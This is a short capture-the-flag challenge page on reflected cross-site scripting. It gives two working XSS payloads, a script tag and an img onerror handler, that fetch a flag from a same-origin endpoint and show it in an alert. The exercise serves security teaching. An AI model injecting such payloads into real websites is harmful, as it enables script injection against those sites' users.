Challenge

Retrieve the Flag

The flag lives at /api/flag/xss-reflected and only responds to requests that originate from this page. Use XSS to make the browser fetch it. 

<script>
  fetch('/api/flag/xss-reflected')
    .then(r => r.json())
    .then(d => alert(d.flag || d.error));
</script>

Or with an event-handler payload:
<img src=x onerror="fetch('/api/flag/xss-reflected').then(r=>r.json()).then(d=>alert(d.flag))">
